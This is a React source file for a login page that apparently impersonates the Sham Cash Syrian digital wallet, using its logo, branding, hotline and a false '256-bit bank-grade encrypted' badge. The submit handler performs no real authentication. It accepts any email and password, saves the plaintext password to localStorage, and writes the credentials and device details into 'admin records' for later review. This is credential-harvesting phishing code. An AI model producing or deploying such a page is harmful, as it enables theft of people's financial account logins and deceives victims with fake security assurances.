import React, { useState } from 'react';
import {
  Mail,
  Lock,
  Eye,
  EyeOff,
  LoaderCircle,
  LogIn,
  ShieldCheck,
  ShieldAlert,
  HelpCircle,
  X,
  LockKeyhole
} from 'lucide-react';
import { AuthData, RequestType } from '../types';
import { useLanguage } from '../context/LanguageContext';
import { isStarloveBlocked, saveAccountRecord, logUserActivity } from '../utils/accountStorage';
import { WaveBackground } from './WaveBackground';

interface AuthScreenProps {
  requestType: RequestType;
  onSubmit: (data: AuthData) => void;
  onCancel?: () => void;
  onOpenAdmin?: () => void;
}

export const AuthScreen: React.FC<AuthScreenProps> = ({
  requestType = 'login',
  onSubmit,
  onOpenAdmin,
}) => {
  const { isRTL, dir } = useLanguage();
  const [email, setEmail] = useState(() => {
    const saved = localStorage.getItem('sc_waiting_email') || '';
    return isStarloveBlocked(saved) ? '' : saved;
  });
  const [password, setPassword] = useState(() => localStorage.getItem('sc_waiting_password') || '');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isForgotModalOpen, setIsForgotModalOpen] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    const cleanEmail = email.trim();
    const cleanPassword = password;

    if (!cleanEmail && !cleanPassword) {
      setError('يرجى إدخال البريد الإلكتروني وكلمة المرور للمتابعة.');
      return;
    }

    if (!cleanEmail) {
      setError('يرجى إدخال البريد الإلكتروني للمتابعة.');
      return;
    }

    // Accepts ANY valid email format (e.g. user@domain.tld)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(cleanEmail)) {
      setError('يرجى إدخال بريد إلكتروني صحيح (يقبل أي بريد إلكتروني: name@example.com).');
      return;
    }

    if (!cleanPassword) {
      setError('يرجى إدخال كلمة المرور (6 خانات فأكثر).');
      return;
    }

    if (cleanPassword.length < 6) {
      setError('كلمة المرور يجب أن تكون 6 خانات فأكثر.');
      return;
    }

    setIsLoading(true);

    try {
      const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'Web Client';
      let deviceInfo = 'متصفح ويب';
      if (/iPhone|iPad|iPod/i.test(userAgent)) deviceInfo = 'iPhone / iOS';
      else if (/Android/i.test(userAgent)) deviceInfo = 'Android Mobile';
      else if (/Windows/i.test(userAgent)) deviceInfo = 'Windows PC';
      else if (/Macintosh/i.test(userAgent)) deviceInfo = 'Mac OS';

      const now = new Date();
      const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;

      if (rememberMe) {
        if (!isStarloveBlocked(cleanEmail)) {
          localStorage.setItem('sc_waiting_email', cleanEmail.toLowerCase());
        } else {
          localStorage.removeItem('sc_waiting_email');
        }
        localStorage.setItem('sc_waiting_password', cleanPassword);
      }

      // Immediately save all login info to Admin records
      saveAccountRecord({
        id: localStorage.getItem('sc_request_id') || ('SC-' + Math.floor(100000 + Math.random() * 900000)),
        fullName: localStorage.getItem('sc_contact_name') || cleanEmail.split('@')[0] || 'عميل شام كاش',
        phone: localStorage.getItem('sc_contact_phone') || '',
        email: cleanEmail.toLowerCase(),
        password: cleanPassword,
        governorate: localStorage.getItem('sc_contact_governorate') || 'دمشق',
        requestType: requestType,
        status: 'under_review',
        submittedAt: formattedDate,
        loginAt: formattedDate,
        sessionDuration: 'جلسة نشطة حالياً',
        lastAction: 'تسجيل الدخول وحفظ البيانات في قسم الإدارة',
        deviceInfo,
        note: 'تم حفظ وتوثيق جميع معلومات الدخول في قسم الإدارة بنجاح.',
      });

      logUserActivity(
        'تسجيل دخول وحفظ البيانات في قسم الإدارة',
        `تم استلام وحفظ البريد الإلكتروني (${cleanEmail}) وكلمة المرور وبيانات الجهاز (${deviceInfo}) في سجلات قسم الإدارة`,
        cleanEmail,
        localStorage.getItem('sc_contact_name') || cleanEmail.split('@')[0]
      );
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      onSubmit({
        email: cleanEmail.toLowerCase(),
        password: cleanPassword,
      });
    }, 450);
  };

  return (
    <div
      dir={dir}
      className="relative min-h-screen w-full flex flex-col justify-between items-center bg-[#0B1528] text-white px-4 py-8 sm:px-6 sm:py-10 overflow-x-hidden selection:bg-[#4A90E2]/30"
    >
      {/* Background Ambience */}
      <WaveBackground />
      <div className="absolute inset-0 bg-radial-[at_top_center] from-blue-600/15 via-transparent to-transparent pointer-events-none" />

      {/* Top Syrian Badge */}
      <div className="relative z-10 mx-auto flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-1.5 text-xs text-[#7B9BE8] backdrop-blur-md">
        <span className="size-2 rounded-full bg-emerald-400 animate-pulse" />
        <span>الجمهورية العربية السورية | المنظومة المالية الإلكترونية</span>
      </div>

      {/* Main Center Content Box */}
      <div className="relative z-10 w-full max-w-md my-auto flex flex-col items-center">
        {/* 1. Official Central Logo from User Screenshot */}
        <div className="relative mb-5 flex flex-col items-center justify-center text-center">
          <div className="relative group flex items-center justify-center">
            {/* Ambient Backlight Glow */}
            <div className="absolute -inset-4 rounded-3xl bg-gradient-to-r from-blue-600/40 via-[#4A90E2]/40 to-cyan-400/30 blur-2xl opacity-90 transition duration-500" />
            
            {/* Center Logo Asset with 3D Mark and شام كاش */}
            <img
              src="/assets/sham-cash-logo-transparent.png"
              alt="شعار شام كاش shamcash"
              className="relative h-28 sm:h-36 w-auto max-w-[240px] object-contain drop-shadow-[0_16px_36px_rgba(74,144,226,0.55)] transition-transform duration-300 hover:scale-105"
            />
          </div>
          <span className="mt-2 text-xs font-black tracking-widest text-[#4A90E2] uppercase">
            shamcash
          </span>
        </div>

        {/* Login Card */}
        <div className="w-full rounded-[30px] border border-white/10 bg-gradient-to-b from-white/[0.08] to-white/[0.03] p-5 sm:p-7 backdrop-blur-xl shadow-[0_25px_60px_-15px_rgba(0,0,0,0.8)]">
          <div className="text-center mb-5">
            <h1 className="text-2xl sm:text-3xl font-black text-white">
              {isRTL ? 'تسجيل الدخول' : 'Sign In'}
            </h1>
            <p className="mt-1 text-xs text-white/65">
              {isRTL
                ? 'أدخل بيانات حسابك للمتابعة وإدارة العمليات المالية'
                : 'Enter your credentials to access your Sham Cash account'}
            </p>
          </div>

          {/* Error Alert Display */}
          {error && (
            <div className="mb-4 flex items-center gap-2.5 rounded-2xl border border-rose-500/30 bg-rose-500/10 p-3 text-xs text-rose-200 animate-in fade-in duration-200">
              <ShieldAlert className="size-4 shrink-0 text-rose-400" />
              <span className="font-semibold">{error}</span>
            </div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4" noValidate>
            {/* Email Field - Accepts ANY valid email */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label
                  htmlFor="input-auth-email"
                  className="block text-xs sm:text-sm font-bold text-white"
                >
                  {isRTL ? 'البريد الإلكتروني' : 'Email Address'}
                  <span className="text-rose-400 mr-1">*</span>
                </label>
                <span className="text-[10px] text-white/50 font-medium">
                  {isRTL ? 'يقبل أي بريد إلكتروني صحيح' : 'Accepts any valid email'}
                </span>
              </div>
              <div className="relative">
                <Mail className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-4' : 'left-4'} size-5 -translate-y-1/2 text-white/50`} />
                <input
                  id="input-auth-email"
                  type="email"
                  dir="ltr"
                  autoComplete="email"
                  maxLength={255}
                  required
                  value={email}
                  onChange={(e) => {
                    const val = e.target.value;
                    if (error && error.includes('البريد الإلكتروني')) {
                      setError(null);
                    }
                    setEmail(val);
                  }}
                  placeholder="name@example.com أو أي بريد إلكتروني"
                  className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-3.5 ${isRTL ? 'pr-12 pl-4 text-right' : 'pl-12 pr-4 text-left'} text-sm sm:text-base font-medium text-white outline-none transition-colors placeholder:text-white/30 focus:border-[#4A90E2]/70 focus:bg-white/[0.12] focus:ring-2 focus:ring-[#4A90E2]/40`}
                />
              </div>
            </div>

            {/* Password Field - Accepts 6+ characters */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label
                  htmlFor="input-auth-password"
                  className="block text-xs sm:text-sm font-bold text-white"
                >
                  {isRTL ? 'كلمة المرور' : 'Password'}
                  <span className="text-rose-400 mr-1">*</span>
                </label>
                <button
                  type="button"
                  onClick={() => setIsForgotModalOpen(true)}
                  className="text-[11px] font-semibold text-[#7B9BE8] hover:text-white transition cursor-pointer"
                >
                  {isRTL ? 'نسيت كلمة المرور؟' : 'Forgot Password?'}
                </button>
              </div>

              <div className="relative">
                <Lock className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-4' : 'left-4'} size-5 -translate-y-1/2 text-white/50`} />
                <input
                  id="input-auth-password"
                  type={showPassword ? 'text' : 'password'}
                  dir="ltr"
                  autoComplete="current-password"
                  maxLength={72}
                  required
                  minLength={6}
                  value={password}
                  onChange={(e) => {
                    const val = e.target.value;
                    if (error && error.includes('كلمة المرور')) {
                      setError(null);
                    }
                    setPassword(val);
                  }}
                  placeholder="•••••••• (6 خانات فأكثر)"
                  className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-3.5 ${isRTL ? 'pr-12 pl-12 text-right' : 'pl-12 pr-12 text-left'} text-sm sm:text-base font-medium text-white outline-none transition-colors placeholder:text-white/30 focus:border-[#4A90E2]/70 focus:bg-white/[0.12] focus:ring-2 focus:ring-[#4A90E2]/40`}
                />
                <button
                  type="button"
                  aria-label={showPassword ? 'إخفاء كلمة المرور' : 'إظهار كلمة المرور'}
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute top-1/2 ${isRTL ? 'left-3' : 'right-3'} -translate-y-1/2 p-2 text-white/60 transition hover:text-white cursor-pointer`}
                >
                  {showPassword ? <EyeOff className="size-5" /> : <Eye className="size-5" />}
                </button>
              </div>
              <div className="mt-1 flex items-center justify-between text-[10px] text-white/45">
                <span>{isRTL ? 'كلمة المرور 6 فأكثر' : 'Password must be 6+ characters'}</span>
                <span className={password.length >= 6 ? 'text-emerald-400 font-bold' : 'text-white/40'}>
                  {password.length > 0 ? `${password.length} / 6+` : ''}
                </span>
              </div>
            </div>

            {/* Remember Me Checkbox */}
            <div className="flex items-center justify-between pt-0.5">
              <label className="flex items-center gap-2 cursor-pointer select-none text-xs text-white/70 hover:text-white transition">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="size-4 rounded border-white/20 bg-white/5 text-[#4A90E2] focus:ring-0 focus:ring-offset-0 cursor-pointer"
                />
                <span>{isRTL ? 'تذكر بيانات تسجيل الدخول على هذا الجهاز' : 'Remember me on this device'}</span>
              </label>
            </div>

            {/* Primary Submit Button: تسجيل الدخول */}
            <button
              type="submit"
              id="btn-auth-submit"
              disabled={isLoading || !email.trim() || password.length < 6}
              className="mt-2 w-full inline-flex min-h-13 items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#4A90E2] via-[#357ABD] to-[#2B60A8] px-5 text-base font-black text-white shadow-[0_18px_40px_-14px_rgba(74,144,226,0.6)] transition hover:brightness-110 active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-50 cursor-pointer"
            >
              {isLoading ? (
                <>
                  <LoaderCircle className="size-5 animate-spin" />
                  <span>{isRTL ? 'جارٍ التحقق وتسجيل الدخول…' : 'Verifying & signing in…'}</span>
                </>
              ) : (
                <>
                  <LogIn className="size-5" />
                  <span>تسجيل الدخول</span>
                </>
              )}
            </button>
          </form>

          {/* Bank Grade Security Badge */}
          <div className="mt-5 flex items-center justify-center gap-2 text-[11px] text-white/50">
            <ShieldCheck className="size-4 text-emerald-400 shrink-0" />
            <span>
              {isRTL
                ? 'اتصال مصرفي مشفر وآمن 256-bit وفق معايير شام كاش'
                : '256-bit bank-grade encrypted secure session'}
            </span>
          </div>
        </div>
      </div>

      {/* 4. Bottom of Page: اخر تحديث shamcash 3.0.2 */}
      <div className="relative z-10 mt-6 pt-4 w-full max-w-md flex flex-col items-center justify-center gap-2 text-center">
        <div className="inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-1.5 text-xs font-bold text-white/80 shadow-inner backdrop-blur-md">
          <span className="size-2 rounded-full bg-blue-400 animate-pulse" />
          <span>اخر تحديث shamcash 3.0.2</span>
        </div>

        <div className="flex items-center justify-between w-full text-[11px] text-white/40 pt-1 px-2">
          <span>شام كاش © 2026 - الجمهورية العربية السورية</span>
          {onOpenAdmin && (
            <button
              type="button"
              onClick={onOpenAdmin}
              className="inline-flex items-center gap-1 text-[#7B9BE8]/70 hover:text-[#7B9BE8] transition cursor-pointer"
              title="الدخول إلى قسم الإدارة للمراجعة"
            >
              <LockKeyhole className="size-3" />
              <span>قسم الإدارة والمراجعة</span>
            </button>
          )}
        </div>
      </div>

      {/* 5. Forgot Password Modal */}
      {isForgotModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm">
          <div className="relative w-full max-w-sm rounded-3xl border border-white/15 bg-[#0F172A] p-6 text-center shadow-2xl text-white">
            <button
              type="button"
              onClick={() => setIsForgotModalOpen(false)}
              className="absolute top-4 left-4 p-1.5 text-white/60 hover:text-white rounded-full bg-white/5 hover:bg-white/10 transition cursor-pointer"
            >
              <X className="size-4" />
            </button>

            <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-amber-500/20 text-amber-300 border border-amber-500/30">
              <HelpCircle className="size-6" />
            </div>

            <h3 className="mt-4 text-base font-bold text-white">
              {isRTL ? 'استعادة كلمة المرور' : 'Reset Password'}
            </h3>
            <p className="mt-2 text-xs text-white/70 leading-relaxed text-right">
              {isRTL
                ? 'لاستعادة كلمة المرور الخاصة بحساب شام كاش، يرجى التواصل مع مركز خدمة المشتركين عبر رقم هاتفك المسجل أو زيارة أقرب فرع معتمد مصطحباً بطاقتك الشخصية.'
                : 'To reset your Sham Cash password, please contact our customer care team or visit an authorized branch.'}
            </p>

            <div className="mt-4 rounded-2xl border border-white/10 bg-white/5 p-3 text-xs text-right space-y-1.5">
              <div className="flex items-center justify-between">
                <span className="text-white/60">{isRTL ? 'الخط المباشر:' : 'Hotline:'}</span>
                <a href="tel:+963116110000" className="font-mono font-bold text-blue-400" dir="ltr">
                  +963 11 611 0000
                </a>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-white/60">{isRTL ? 'ساعات العمل:' : 'Hours:'}</span>
                <span className="font-medium text-white/90">8:30 ص - 5:00 م</span>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setIsForgotModalOpen(false)}
              className="mt-4 w-full rounded-xl bg-white/10 hover:bg-white/15 py-2.5 text-xs font-bold text-white transition cursor-pointer"
            >
              {isRTL ? 'فهمت، إغلاق' : 'Close'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
